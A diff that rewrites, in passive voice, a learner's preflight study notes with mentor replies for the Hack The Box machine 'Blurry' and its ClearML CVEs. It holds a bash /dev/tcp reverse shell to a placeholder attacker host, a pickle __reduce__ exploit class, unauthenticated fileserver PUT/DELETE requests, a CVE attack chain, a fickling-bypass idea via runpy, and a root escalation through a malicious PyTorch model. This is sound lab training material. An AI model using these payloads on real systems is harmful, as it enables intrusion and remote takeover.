@@ -16,24 +16,24 @@
 
 ## Pre-flight Begin
 
-Before you touch any CVE details, do preflight questions first.
+Before any CVE details are touched, preflight questions are to be completed first.
 Prior knowledge only, 10 minutes.
 
 ---
 
-**1. ClearML is an MLOps platform.** Without looking anything up — what attack surface do you expect an MLOps platform to expose? What services, what endpoints, what kinds of operations does it likely perform?
+**1. ClearML is an MLOps platform.** Without anything being looked up — what attack surface is an MLOps platform expected to expose? What services, what endpoints, what kinds of operations are likely performed?
 
-**2. The description says "a web platform, a fileserver, and an API."** Which of those three surfaces do you instinctively think is the most dangerous and why?
+**2. The description says "a web platform, a fileserver, and an API."** Which of those three surfaces is instinctively considered the most dangerous and why?
 
-**3. You've done pickle deserialization twice now — Canape and the exploit dev work on Laboratory.** What's the primitive? How does a malicious pickle file achieve code execution?
+**3. Pickle deserialization has been performed twice now — Canape and the exploit development work on Laboratory.** What is the primitive? How is code execution achieved by a malicious pickle file?
 
-**4. `fickling` is a static analysis tool that scans pickle files for unsafe opcodes.** Without knowing how it works internally — what's your hypothesis for how `runpy` bypasses it? What property of `runpy` would make it invisible to a static scanner?
+**4. `fickling` is a static analysis tool that scans pickle files for unsafe opcodes.** Without its internal workings being known — what is the hypothesis for how `runpy` bypasses it? What property of `runpy` would make it invisible to a static scanner?
 
 ---
 
-10 minutes. These four answers are your prediction document. Write what you know and what you're uncertain about — uncertainty is data too.
+10 minutes. These four answers constitute the prediction document. What is known and what is uncertain is to be written — uncertainty is data too.
 
-(I spent 2.5 hours, was starting from scratch with some of these topics and technologies)
+(2.5 hours were spent, with some of these topics and technologies being started from scratch)
 
 
 **Formatted Q&A:**
@@ -41,69 +41,69 @@ Prior knowledge only, 10 minutes.
 ---
 
 **Q1:**
-These four answers are your prediction document. Write what you know and what you're uncertain about — uncertainty is data too.
+These four answers constitute the prediction document. What is known and what is uncertain is to be written — uncertainty is data too.
 
 **A1:**
-ClearML is an is new to me, I will have to research it, and  MLOps.
+ClearML is new, and research of it, and of MLOps, is required.
 
 ---
 
 **Q2:**
-The description says "a web platform, a fileserver, and an API." Which of those three surfaces do you instinctively think is the most dangerous and why?
+The description says "a web platform, a fileserver, and an API." Which of those three surfaces is instinctively considered the most dangerous and why?
 
 **A2:**
-I think that the API is the most dangerous.
-My view on that may be just experience bias.
-You got the usual API vulns like IDOR, BFLA.
-The "web platform" name is too broad and general, that could be anything.
+The API is thought to be the most dangerous.
+This view may be experience bias.
+The usual API vulnerabilities such as IDOR and BFLA are present.
+The "web platform" name is too broad and general; it could be anything.
 
 ---
 
 **Q3:**
-You've done pickle deserialization twice now — Canape and the exploit dev work on Laboratory. What's the primitive? How does a malicious pickle file achieve code execution?
+Pickle deserialization has been performed twice now — Canape and the exploit development work on Laboratory. What is the primitive? How is code execution achieved by a malicious pickle file?
 
 **Reworded Q3 (for clarity):**
-You've now worked with Python pickle deserialization on both **Canape** and during the Laboratory exploit development.
+Python pickle deserialization has now been worked with on both **Canape** and during the Laboratory exploit development.
 At its core, what is the dangerous primitive that makes pickle deserialization so powerful for an attacker?
-In simple terms, how does a malicious pickle file actually achieve remote code execution?
+In simple terms, how is remote code execution actually achieved by a malicious pickle file?
 
 **A3:**
-If the malicious pickle file can be augmented, and a payload, such as a reverse shell command, for example `/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'`, be inserted in the serialized object, and sent to / uploaded onto the server, and that reverse shell command can connect to the attacker's server.
+If the malicious pickle file can be augmented, and a payload, such as a reverse shell command, for example `/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'`, is inserted in the serialized object, and sent to / uploaded onto the server, and that reverse shell command can connect to the attacker's server.
 
 ---
 
 **Q4:**
 `fickling` is a static analysis tool that scans pickle files for unsafe opcodes.
-Without knowing how it works internally — what's your hypothesis for how `runpy` bypasses it?
+Without its internal workings being known — what is the hypothesis for how `runpy` bypasses it?
 What property of `runpy` would make it invisible to a static scanner?
 
 **A4:**
-I `fickling` is a new to me, will need further research.
-If it performs static analysis, then I'm assuming that it may be like Jaddix which is a static analysis tool for Android APKs.
+`fickling` is new, and further research is needed.
+If static analysis is performed, then it is assumed that it may be like Jaddix which is a static analysis tool for Android APKs.
 And that maybe `fickling` works similarly.
-Wait, I'm confused, which one is the static analysis tool????
+Confusion was present regarding which one is the static analysis tool.
 fickling or runpy??
-I don't have enough background on any of this.
+Enough background is not possessed on any of this.
 
-### Mentors Response
+### Mentor Response
 
-Good. Honest answers — that's exactly what preflight is for. Let me close the gaps before we go read the CVEs, so you can read them with context instead of confusion.
+The answers are honest — that is exactly what preflight is for. The gaps are to be closed before the CVEs are read, so that they can be read with context instead of confusion.
 
 ---
 
-## Quick fills — read these, then we research
+## Quick fills — these are to be read, then research is to be conducted
 
 **Q1 — ClearML / MLOps**
 
-MLOps = Machine Learning Operations. Think of it like DevOps but for ML models. ClearML is a platform where data scientists track experiments, store trained models, and share datasets. Attack surface intuition: anywhere files are uploaded, stored, and loaded by other users or automated processes. A model file that gets automatically loaded by a server is a deserialization trigger waiting to happen.
+MLOps = Machine Learning Operations. It is analogous to DevOps but for ML models. ClearML is a platform where data scientists track experiments, store trained models, and share datasets. Attack surface intuition: anywhere files are uploaded, stored, and loaded by other users or automated processes. A model file that gets automatically loaded by a server is a deserialization trigger waiting to happen.
 
 **Q2 — API most dangerous**
 
-Good instinct, and correct for the usual reasons. But on this box the fileserver is equally important — because that's where model files live. The chain likely runs through the API to get a malicious file onto the fileserver, then something loads it.
+The instinct is good, and correct for the usual reasons. On this box the fileserver is equally important — because that is where model files live. The chain likely runs through the API so that a malicious file is gotten onto the fileserver, then something loads it.
 
 **Q3 — The pickle primitive**
 
-You described the payload correctly but not the primitive. The dangerous primitive is `__reduce__`. When Python deserializes a pickle file, if the object has a `__reduce__` method, Python calls it automatically — no user interaction, no validation. You return an `os.system` call from `__reduce__` and it executes on deserialization. The reverse shell lives inside `__reduce__`, not injected separately.
+The payload was described correctly but the primitive was not. The dangerous primitive is `__reduce__`. When Python deserializes a pickle file, if the object has a `__reduce__` method, Python calls it automatically — no user interaction, no validation. An `os.system` call is returned from `__reduce__` and it is executed on deserialization. The reverse shell lives inside `__reduce__`, not injected separately.
 
 ```python
 class Exploit:
@@ -111,33 +111,33 @@ class Exploit:
         return (os.system, ('bash -i >& /dev/tcp/IP/PORT 0>&1',))
 ```
 
-Pickle that object. Server deserializes it. Shell fires. That's the primitive.
+That object is pickled. It is deserialized by the server. The shell is fired. That is the primitive.
 
 **Q4 — fickling vs runpy**
 
-`fickling` is the static analysis tool — it reads the pickle file's opcodes without executing it, looking for dangerous calls like `REDUCE` paired with `os.system` or `subprocess`. It's the defender.
+`fickling` is the static analysis tool — it reads the pickle file's opcodes without executing it, looking for dangerous calls like `REDUCE` paired with `os.system` or `subprocess`. It is the defender.
 
-`runpy` is Python's built-in module runner — it executes a Python module by name. Your hypothesis question was: why would `runpy` be invisible to fickling? Think about it this way — fickling scans for dangerous _pickle opcodes_. If your payload doesn't use those opcodes directly, but instead uses a pickle opcode that calls `runpy`, which _then_ loads and executes code — fickling never sees the dangerous part. The malicious code isn't in the pickle file. It's in a module that `runpy` loads at runtime.
+`runpy` is Python's built-in module runner — it executes a Python module by name. The hypothesis question was: why would `runpy` be invisible to fickling? It is to be considered this way — fickling scans for dangerous _pickle opcodes_. If the payload does not use those opcodes directly, but instead uses a pickle opcode that calls `runpy`, which _then_ loads and executes code — the dangerous part is never seen by fickling. The malicious code isn't in the pickle file. It's in a module that `runpy` loads at runtime.
 
-Static analysis can only see what's in the file. `runpy` moves the danger outside the file.
+Static analysis can only see what's in the file. The danger is moved outside the file by `runpy`.
 
 ---
 
-Now you have enough context to read the CVEs intelligently.
+Enough context is now possessed for the CVEs to be read intelligently.
 
-Go read these four in order — skim for the mechanism, not the CVSS score:
+These four are to be read in order — the mechanism is to be skimmed for, not the CVSS score:
 
 1. `https://nvd.nist.gov/vuln/detail/CVE-2024-24590`
 2. `https://nvd.nist.gov/vuln/detail/CVE-2024-24591`
 3. `https://nvd.nist.gov/vuln/detail/CVE-2024-24592`
 4. `https://nvd.nist.gov/vuln/detail/CVE-2024-24593`
 
-For each one, one sentence: what does it let you do? Come back with those four sentences and we'll build the prediction document.
+For each one, one sentence: what is permitted to be done? Those four sentences are to be returned and the prediction document is to be built.
 
 ---
 
-# Some more explains with code snippets
-**Here are expanded summaries for each CVE**, with more technical detail and realistic code examples (based on the vulnerability descriptions and typical ClearML patterns). I kept them clear and used analogies where helpful.
+# Further explanations with code snippets
+**Expanded summaries for each CVE are provided**, with more technical detail and realistic code examples (based on the vulnerability descriptions and typical ClearML patterns). They were kept clear and analogies were used where helpful.
 
 ### **CVE-2024-24590 – Pickle Load on Artifact Get**
 
@@ -167,7 +167,7 @@ with open("malicious.pkl", "wb") as f:
     pickle.dump(exploit, f)
 ```
 
-**Analogy**: Same as the Python pickle RCE you did in **Canape** — the victim’s machine is essentially running whatever code the attacker hid inside the pickle when it tries to “load” the file.
+**Analogy**: Same as the Python pickle RCE performed in **Canape** — the victim’s machine is essentially running whatever code was hidden inside the pickle by the attacker when the file is “loaded”.
 
 ---
 
@@ -193,7 +193,7 @@ def _download_external_files(self, dataset):
 }
 ```
 
-**Analogy**: Exactly like the Path Traversal lab you just solved — the app thinks it’s writing a normal dataset file into a safe folder, but the attacker forces it to write (or read) anywhere on the filesystem.
+**Analogy**: Exactly like the Path Traversal lab that was just solved — the app is thought to be writing a normal dataset file into a safe folder, but it is forced by the attacker to write (or read) anywhere on the filesystem.
 
 ---
 
@@ -210,7 +210,7 @@ PUT  http://clearml-fileserver:8081/files/project/malicious.pkl     # Upload evi
 DELETE http://clearml-fileserver:8081/files/project/victim-file
 ```
 
-**Analogy**: Imagine a file server where every folder is wide open — no passwords, no tokens, no checks. Anyone on the network (or internet) can read or plant files in any project’s storage.
+**Analogy**: A file server is imagined where every folder is wide open — no passwords, no tokens, no checks. Anyone on the network (or internet) can read or plant files in any project’s storage.
 
 ---
 
@@ -237,7 +237,7 @@ The ClearML API and web server have **no CSRF tokens or same-origin checks** on 
 
 
 
-**Here are the expanded summaries for all four CVEs**, with more detailed explanations, the code examples, and a clear statement of **what each one lets the attacker do**.
+**The expanded summaries for all four CVEs are provided**, with more detailed explanations, the code examples, and a clear statement of **what each one lets the attacker do**.
 
 ---
 
@@ -256,7 +256,7 @@ model = artifact.get()          # ← This internally calls pickle.load()
 ```
 
 **What this lets the attacker do**:
-The attacker can upload a malicious pickle file that executes arbitrary code (reverse shell, data exfiltration, etc.) on **any victim’s machine** the moment they try to download and load the artifact. This is a classic insecure deserialization vulnerability, exactly like the ones you exploited in Canape and Laboratory.
+A malicious pickle file can be uploaded by the attacker that executes arbitrary code (reverse shell, data exfiltration, etc.) on **any victim’s machine** the moment they try to download and load the artifact. This is a classic insecure deserialization vulnerability, exactly like the ones that were exploited in Canape and Laboratory.
 
 ---
 
@@ -282,7 +282,7 @@ for file_info in dataset.files:
 ```
 
 **What this lets the attacker do**:
-The attacker can force the victim’s machine to write (or read) files to **any location** on the filesystem, including overwriting system files, stealing sensitive data, or placing malicious files in locations that will be executed later.
+The victim’s machine can be forced by the attacker to write (or read) files to **any location** on the filesystem, including overwriting system files, stealing sensitive data, or placing malicious files in locations that will be executed later.
 
 ---
 
@@ -300,7 +300,7 @@ DELETE http://clearml-fileserver:8081/files/project/victim-file
 ```
 
 **What this lets the attacker do**:
-The attacker can **read, upload, modify, or delete any file** stored on the ClearML server, including other users’ private models, datasets, and artifacts. This gives them a very powerful way to plant malicious pickles or datasets that will later be used in the other CVEs.
+**Any file** stored on the ClearML server can be **read, uploaded, modified, or deleted** by the attacker, including other users’ private models, datasets, and artifacts. This gives them a very powerful way to plant malicious pickles or datasets that will later be used in the other CVEs.
 
 ---
 
@@ -319,12 +319,12 @@ The ClearML web server and API have **no CSRF protection** (no tokens, no same-o
 ```
 
 **What this lets the attacker do**:
-The attacker can trick a logged-in ClearML user into performing **any action** on their behalf (creating projects, inviting users, modifying settings, etc.) without the victim realizing it. This is a full account takeover vector if the victim has high privileges.
+A logged-in ClearML user can be tricked by the attacker into performing **any action** on their behalf (creating projects, inviting users, modifying settings, etc.) without the victim realizing it. This is a full account takeover vector if the victim has high privileges.
 
 ---
 
 
-# One sentence each — what does it let you do?
+# One sentence each — what is permitted to be done?
 
 **CVE-2024-24590 – Pickle Load on Artifact Get**
 Allows an attacker to upload a malicious pickle file that can execute a reverse
@@ -347,9 +347,9 @@ Allows the attacker to trick a logged-in ClearML user into performing any action
 
 ---
 
-# Mentor Explains How to Chain these in an attack
+# Explanation of How These Are Chained in an Attack
 
-Good. Accurate on all four. Now let me sharpen them into a chain because these don't operate independently — they stack.
+All four are accurate. They are now to be sharpened into a chain because these don't operate independently — they stack.
 
 ---
 
@@ -373,20 +373,20 @@ CVE-2024-24590 (Pickle load on artifact get)
 Server deserializes the pickle → __reduce__ fires → RCE
 ```
 
-CSRF gets you authenticated access. No-auth fileserver lets you upload. Path traversal controls placement. Pickle load pulls the trigger.
+Authenticated access is obtained via CSRF. Upload is permitted by the no-auth fileserver. Placement is controlled by path traversal. The trigger is pulled by pickle load.
 
 ---
 
-Now write your prediction document. This is your preflight for Blurry — fill this in cold based on everything we've discussed:
+The prediction document is now to be written. This is the preflight for Blurry — it is to be filled in cold based on everything that has been discussed:
 
 ```markdown
 ## Blurry Preflight Predictions
 
 ### Foothold
-- Attack surface I expect to find:
-- CVE chain order I predict:
-- What the malicious payload looks like:
-- Where I expect to get stuck:
+- Attack surface expected to be found:
+- CVE chain order predicted:
+- What the malicious payload is expected to look like:
+- Where getting stuck is expected:
 
 ### Post-exploitation
 - What the sudo program probably does:
@@ -396,7 +396,7 @@ Now write your prediction document. This is your preflight for Blurry — fill t
 ### Predicted rabbit holes to avoid:
 ```
 
-Fill it in. This is the document you compare against reality after you root the box.
+It is to be filled in. This is the document against which reality is compared after the box is rooted.
 
 ---
 
@@ -405,13 +405,13 @@ Fill it in. This is the document you compare against reality after you root the 
 ---
 
 **Table of Contents**
-(what is being asked, and what I am predicting)
+(what is being asked, and what is being predicted)
 
 ## Foothold
-- Attack surface I expect to find:
-- CVE chain order I predict:
-- What the malicious payload looks like:
-- Where I expect to get stuck:
+- Attack surface expected to be found:
+- CVE chain order predicted:
+- What the malicious payload is expected to look like:
+- Where getting stuck is expected:
 
 ## Post-exploitation
 - What the sudo program probably does:
@@ -422,7 +422,7 @@ Fill it in. This is the document you compare against reality after you root the 
 
 ---
 
-**Need to understand this first, before I can complete this Preflight questionnaire.**
+**This is needed to be understood first, before this Preflight questionnaire can be completed.**
 **ClearML is a Machine Learning Operations platform for the full ML lifecycle management.**
 
 In practice, it helps teams:
@@ -433,14 +433,14 @@ In practice, it helps teams:
 - Automate pipelines (training, evaluation, deployment workflows)
 - Collaborate and reproduce results across a team
 
-So, think of it as DevOps for machine learning: it brings structure, reproducibility, and automation to model development and deployment.
+So, it is to be thought of as DevOps for machine learning: it brings structure, reproducibility, and automation to model development and deployment.
 
 ---
 
 ### Foothold
-- **Attack surface I expect to find:**
+- **Attack surface expected to be found:**
 
-I'm looking for What data comes in, Who controls it, Where is it consumed, and if I can act with more privilege?
+What data comes in, who controls it, where it is consumed, and whether action can be taken with more privilege is being looked for.
 
 1) Web UI:
 Dashboard/features users click (projects, experiments, artifacts, settings, admin actions).
@@ -471,16 +471,16 @@ Dashboard/features users click (projects, experiments, artifacts, settings, admi
 
 6) ClearML functionality,
 - version tracking, metrics and logs, datasets model artifacts
-- I expect to find a lack of validation or safe loading for deserialization.
+- A lack of validation or safe loading for deserialization is expected to be found.
 - An absence of SOP Same Origin Policy, (would likely explain the CSRF vuln)
 
 ### End of Foothold ###
 
 ---
 
-- **CVE chain order I predict:**
+- **CVE chain order predicted:**
 
-I expect this CVE chain order:
+This CVE chain order is expected:
 ```
 CVE-2024-24593 (CSRF)
         ↓
@@ -499,7 +499,7 @@ CVE-2024-24590 (Pickle load on artifact get)
 Server deserializes the pickle → __reduce__ fires → RCE
 ```
 
-- **What the malicious payload looks like:**
+- **What the malicious payload is expected to look like:**
 A maliciously crafted pickle file containing a custom class instance engineered to execute arbitrary code during deserialization via `__reduce__`.
 
 ```python
@@ -512,26 +512,26 @@ class Exploit:
 payload = pickle.dumps(Exploit())
 ```
 
-- **Where I expect to get stuck:**
-Some realistic friction points — auth/session flow, path normalization, getting the loader to touch my file, environment-specific triggers.
+- **Where getting stuck is expected:**
+Some realistic friction points — auth/session flow, path normalization, getting the loader to touch the file, environment-specific triggers.
 
-However, If past experience is any indicator of future performance, then I predict that **THE STICKIEST PART OF THIS ENTIRE BOX WILL BE CRAFTING, OR EDITING THE EXPLOIT TO WORK AS INTENDED.**
+However, if past experience is any indicator of future performance, then it is predicted that **THE STICKIEST PART OF THIS ENTIRE BOX WILL BE CRAFTING, OR EDITING THE EXPLOIT TO WORK AS INTENDED.**
 
 ### Post-exploitation
 - **What the sudo program probably does:**
-The sudo program is a script that loads arbitrary PyTorch models to evaluate them against a protected dataset. It is probably something like `evaluate_model.py`. The privesc is: you give it a malicious PyTorch model → it deserializes it as root → shell as root.
+The sudo program is a script that loads arbitrary PyTorch models to evaluate them against a protected dataset. It is probably something like `evaluate_model.py`. The privesc is: a malicious PyTorch model is given to it → it is deserialized as root → a shell as root is obtained.
 
 - **How fickling gets bypassed via runpy:**
 Static vs runtime.
-What can static inspection see? It can see vulnerable code, and dangerous patterns such as the dunder reduce method `__reduce__` calling `os.system`.
+What can be seen by static inspection? Vulnerable code can be seen, and dangerous patterns such as the dunder reduce method `__reduce__` calling `os.system`.
 
 What does runtime module execution add that static analysis may miss?
 Runtime module execution.
 
-Fickling scans the pickle, runpy hides the payload outside the pickle.
+The pickle is scanned by fickling, the payload is hidden outside the pickle by runpy.
 
 - **Confidence level (1-10):**
-Score each section separately first:
+Each section is to be scored separately first:
 foothold: 90%
 chain: 90%
 post-exploit: 40%
@@ -539,7 +539,7 @@ post-exploit: 40%
 then average: 73
 
 ### Predicted rabbit holes to avoid:
-- Working on a part of the web app, some feature or functionality, of which I am sure contains a vuln, but it doesn't.
+- Working on a part of the web app, some feature or functionality, of which it is believed that a vulnerability is contained, but it doesn't.
 - incorrectly crafting a payload
 - Pursuing a false positive, or some other indicator
 
@@ -551,50 +551,33 @@ then average: 73
 ---
 
 
-# Mentor approves - just one correction
+# Approval — One Correction
 
-Preflight is solid. Good enough to start. Let's score it fast and get you on the box.
+The preflight is solid. It is good enough to start. It is to be scored quickly and the box is to be started.
 
 ---
 
 ## Quick Assessment
 
-**Foothold (90% your score)** — Justified. Attack surface analysis is thorough. CVE chain order is correct. Payload is correct.
+**Foothold (90% as scored)** — Justified. Attack surface analysis is thorough. CVE chain order is correct. Payload is correct.
 
-**One correction on post-exploitation** — The sudo program isn't about ClearML admin privileges. Re-read the box description:
+**One correction on post-exploitation** — The sudo program isn't about ClearML admin privileges. The box description is to be re-read:
 
 > *"A program that can be run with sudo loads arbitrary PyTorch models to evaluate them against a protected dataset."*
 
-It's a script that loads PyTorch model files. That's it. Probably something like `evaluate_model.py`. The privesc is: you give it a malicious PyTorch model → it deserializes it as root → shell as root. The fickling bypass is how you get past the safety check built into that script.
+It is a script that loads PyTorch model files. That is it. Probably something like `evaluate_model.py`. The privesc is: a malicious PyTorch model is given to it → it is deserialized as root → a shell as root is obtained. The fickling bypass is how the safety check built into that script is gotten past.
 
-**Post-exploit confidence should be lower** — maybe 40%, not 60%. You haven't seen this specific pattern before. That's fine — you know the theory, the box will teach the practice.
-
-
+**Post-exploit confidence should be lower** — maybe 40%, not 60%. This specific pattern has not been seen before. That is fine — the theory is known, the practice is to be taught by the box.
 
 
-# You're cleared to start the box.
 
-Standard methodology — nmap first, write as you go, come back here when you hit friction or want to think something through.
 
-One reminder: **debrief within 24 hours of rooting.** We established that rule today for a reason.
+# Clearance to start the box is given.
 
-Go get it.
+Standard methodology — nmap first, writing is to be done as work proceeds, a return here is to be made when friction is hit or something is to be thought through.
+
+One reminder: **debrief is to be completed within 24 hours of rooting.** That rule was established today for a reason.
+
+It is to be obtained.
 
 ---
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
